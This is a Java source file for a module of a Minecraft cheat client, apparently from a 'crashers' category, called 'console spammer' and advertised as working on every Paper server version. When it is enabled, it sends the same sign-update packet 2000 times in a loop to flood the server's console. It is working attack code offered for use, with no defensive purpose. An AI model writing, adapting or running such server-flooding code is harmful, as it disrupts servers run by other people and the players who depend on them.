    package voltik.qpa.czopekhookreborn.feature.module.modules.crashers;

    import net.minecraft.client.MinecraftClient;
    import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
    import net.minecraft.text.Text;
    import net.minecraft.util.math.BlockPos;
    import org.lwjgl.glfw.GLFW;
    import voltik.qpa.czopekhookreborn.feature.module.Categories;
    import voltik.qpa.czopekhookreborn.feature.module.Module;
    import voltik.qpa.czopekhookreborn.feature.module.ModuleInfo;

    @ModuleInfo(category = Categories.MISC, name = "console spammer", description = "console spammer for every paper version", keybind = GLFW.GLFW_KEY_L)
    public class ConsoleSpammer extends Module {


        @Override
        public void onTick() {
        }

        @Override
        protected void onEnable() {
            MinecraftClient client = MinecraftClient.getInstance();

           client.player.sendMessage(Text.literal("work ON"), false);


                BlockPos targetPos = client.player.getBlockPos().down();

                UpdateSignC2SPacket packet = new UpdateSignC2SPacket(
                        targetPos,
                        true,
                        "",
                        "",
                        "",
                        ""
                );

                for (int i = 0; i < 2000; i++) {
                    client.getNetworkHandler().sendPacket(packet);
                }

                client.player.sendMessage(Text.literal("work OFF"), false);

                this.setEnabled(false);

        }

        @Override
        protected void onDisable() {

        }
    }
